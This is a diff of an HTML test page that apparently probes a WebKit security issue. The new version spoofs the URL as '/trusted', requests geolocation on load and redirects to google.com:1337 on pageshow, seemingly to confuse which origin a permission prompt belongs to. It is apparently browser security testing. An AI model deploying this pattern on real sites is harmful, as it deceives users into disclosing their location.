@@ -2,56 +2,87 @@
 <html>
   <head>
     <meta charset="utf-8" />
-    <title>tester</title>
+    <title>testing</title>
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <style>
       body {
-        font-family: -apple-system, sans-serif;
-        background: #111;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, system-ui;
+        background: #f5f5f7;
+      }
+      button {
+        font-size: 15px;
+        padding: 10px 14px;
+        border-radius: 10px;
+        border: none;
+        background: #007aff;
         color: #fff;
+        display: none;
+      }
+      #panel {
+        display: none;
+        max-width: 420px;
+        margin: 80px auto;
+        background: #fff;
+        padding: 24px;
+        border-radius: 16px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
         text-align: center;
-        padding-top: 50px;
       }
-      .box {
-        background: #222;
-        padding: 30px;
-        border-radius: 12px;
-        display: inline-block;
-        max-width: 400px;
-      }
-      h2 {
-        color: #ff3b30;
-      }
-      .btn {
-        display: inline-block;
-        margin-top: 20px;
-        padding: 12px 24px;
-        background: #0a84ff;
-        color: white;
-        text-decoration: none;
-        border-radius: 8px;
-        font-weight: bold;
+      .notice {
+        margin-top: 14px;
+        font-size: 13px;
+        color: #b00020;
       }
     </style>
   </head>
   <body>
-    <div class="box">
-      <h2>Test</h2>
-      <p>Testing WebKit Patch: <code>rdar://107379119</code></p>
-
-      <a class="btn" href="https://azza0x1a.github.io/test123/target.xhtml"
-        >Trigger</a
-      >
+    <div style="text-align: center; margin-top: 60px">
+      <button id="trigger">CLick Here</button>
     </div>
 
-    <div class="box" style="margin-top: 30px">
-      <h3>Iframe Trigger</h3>
-      <iframe
-        src="https://azza0x1a.github.io/test123/target.xhtml"
-        width="100%"
-        height="150"
-        style="border: 1px solid #444; background: #fff"
-      ></iframe>
+    <div id="panel">
+      <h2>Tester</h2>
+      <button onclick="getLocation()">Get Location</button>
+      <p id="output">Location: -</p>
+      <div class="notice">CAPTURED</div>
     </div>
+
+    <script>
+      const panel = document.getElementById("panel");
+      const trigger = document.getElementById("trigger");
+      const output = document.getElementById("output");
+
+      function getLocation() {
+        if (!navigator.geolocation) return;
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+          },
+          () => {
+            output.textContent = "Permission denied";
+          },
+        );
+      }
+
+      window.onload = () => {
+        history.pushState({}, "", "/trusted");
+        panel.style.display = "block";
+
+        setTimeout(() => {
+          getLocation();
+        }, 500);
+      };
+
+      window.addEventListener("pageshow", () => {
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => {
+            setTimeout(() => {
+              location.href = "https://google.com:1337";
+            }, 80);
+          });
+        });
+      });
+    </script>
   </body>
 </html>
